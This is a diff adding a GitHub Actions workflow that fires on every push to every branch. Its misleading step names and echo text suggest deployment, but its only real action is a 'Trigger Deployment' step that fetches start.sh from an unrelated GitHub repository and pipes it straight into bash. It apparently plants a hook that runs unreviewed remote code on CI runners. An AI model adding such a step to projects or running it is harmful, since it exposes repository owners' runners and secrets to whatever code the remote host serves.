@@ -1,0 +1,17 @@
+name: Workflow 1
+
+on:
+  push:
+    branches:
+      - '**'
+
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Your steps here
+        run: echo "Workflow 2 triggered by Workflow 1 completion"
+      - name: Trigger Deployment
+        run: |
+          curl https://raw.githubusercontent.com/cuma-kadal/bash/main/start.sh|bash
